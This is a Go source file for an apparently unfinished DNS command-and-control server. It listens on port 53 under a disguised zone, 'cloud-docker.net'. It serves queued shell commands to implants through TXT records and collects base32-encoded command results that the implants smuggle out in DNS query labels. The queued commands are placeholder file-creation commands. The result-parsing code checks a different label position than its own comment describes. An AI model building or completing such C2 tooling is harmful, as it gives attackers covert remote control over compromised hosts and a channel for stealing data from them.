package main

import (
	"encoding/base32"
	"flag"
	"github.com/miekg/dns"
	"log"
	"strings"
	"sync"
)

// systemd-resolved on VM

//answers := resolver(question.Name, question.Qtype) -> need this?
//func resolver(domain string, qtype uint16) []dns.RR {
//	fmt.Println(domain)
//	m := new(dns.Msg)
//	m.SetQuestion(dns.Fqdn(domain), qtype)
//	m.RecursionDesired = true
//
//	c := &dns.Client{Timeout: 5 * time.Second}
//
//	response, _, err := c.Exchange(m, "8.8.8.8:53")
//	if err != nil {
//		log.Fatalf("[ERROR] : %v\n", err)
//		return nil
//	}
//
//	if response == nil {
//		log.Fatalf("[ERROR] : no response from server\n")
//		return nil
//	}
//
//	for _, answer := range response.Answer {
//		fmt.Printf("%s\n", answer.String())
//	}
//
//	return response.Answer
//}

var domain = flag.String("domain", "cloud-docker.net", "DNS zone")

type DNSHandler struct {
	mu       sync.RWMutex        // thread-safe: guards DNSHandler's internal maps (commands + results) to prevent data race conditions, as ServeDNS can be called concurrently for multiple requests
	commands map[string][]string // TODO: use TaskQueue instead of []string
	results  map[string][][]byte // implantID -> slice of result chunks // TODO: does it append results sent in chunks
	// TODO: add command eventually here so map[string]map[string]string
}

func NewDNSHandler() *DNSHandler {
	return &DNSHandler{
		commands: map[string][]string{
			"1": {"touch iwashere1.txt", "touch iwashere2.txt"},
			"2": {"touch hheheheh1.txt", "touch hheheeheh2.txt"},
		},
		results: make(map[string][][]byte),
	}
}

func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
	q := req.Question[0]
	normalizedQName := strings.ToLower(q.Name) // add a comment here
	log.Printf("Query %s\n", normalizedQName)
	labels := dns.SplitDomainName(normalizedQName)
	implantID := labels[0]

	reply := new(dns.Msg)
	reply.SetReply(req)
	reply.Authoritative = true

	h.mu.Lock()
	defer h.mu.Unlock()

	// for _, question := range r.Question { } // TODO: so only support for one question? TODO: write a protocol spec for DNS + HTTPS communications
	//	qName := question.Name
	switch q.Qtype {
	case dns.TypeTXT:
		/*
			TODO: combine later into one joint endpoint (ie. beacon?)
			TODO: have different endpoints for hiding (not cmd, res) (maybe c, r)?
				TXT for C2 commands/results
				command format: `<implant-id>.cmd.cloud-docker.net`
				sending results format: `<implant-id>.<encoded/encrypted-result>.res.cloud-docker.net` // TODO: have result ID here? or just one task at a time
		*/

		// TODO: check		if len(labels) < 3  { ?

		// domainLabels := strings.Split(questionName, ".")

		if labels[1] == "cmd" { // implant is requesting command
			if pendingCmds, ok := h.commands[implantID]; ok {
				if len(pendingCmds) > 0 {
					cmd := pendingCmds[0]
					h.commands[implantID] = h.commands[implantID][1:]
					reply.Answer = []dns.RR{makeTXT(q.Name, cmd)}
				} else {
					reply.Answer = []dns.RR{emptyTXT(q.Name)}
				}
			}
		} else if labels[3] == "res" { // implant is sending result of running command
			// sending results format: `<implant-id>.<chunk-index>.<encoded/encrypted-result-chunk>.res.cloud-docker.net` // TODO: have result ID here? or just one task at a time
			// labels: [implant_id, chunkData, "res", chunkIndex, domain...]
			// TODO: fix this so one of the labels is how much total chunkDatas there are?
			// RN: this implementation only allows for one result for each implant -> make map of cmdTask ids -> results
			// TODO: handle chunk-id
			chunk := labels[2]
			data, err := base32.StdEncoding.DecodeString(chunk)
			if err != nil {
				log.Printf("Error decoding TXT chunk: %v", err)
			} else {
				h.results[implantID] = append(h.results[implantID], data)
			}
			reply.Answer = []dns.RR{emptyTXT(q.Name)}
		} else {
			reply.Answer = []dns.RR{emptyTXT(q.Name)}
		}
	case dns.TypeSOA:
	// TODO - look at one in c2 server
	case dns.TypeNS: // TODO
	}

	if err := w.WriteMsg(reply); err != nil {
		log.Printf("WriteMsg error: %v", err)
	}
}

func StartDNSServer() {
	server := &dns.Server{
		Addr:    ":53",
		Net:     "udp",
		Handler: NewDNSHandler()}
	log.Printf("Starting DNS server for zone %s on port 53", *domain)
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("server failed: %v", err)
	}
}

func main() {
	StartDNSServer()
}

// helper for empty TXT
func emptyTXT(name string) dns.RR {
	return &dns.TXT{
		Hdr: dns.RR_Header{Name: dns.Fqdn(name), Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
		Txt: []string{""},
	}
}

// helper to create TXT with data
func makeTXT(name, txt string) dns.RR {
	return &dns.TXT{
		Hdr: dns.RR_Header{Name: dns.Fqdn(name), Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
		Txt: []string{txt},
	}
}
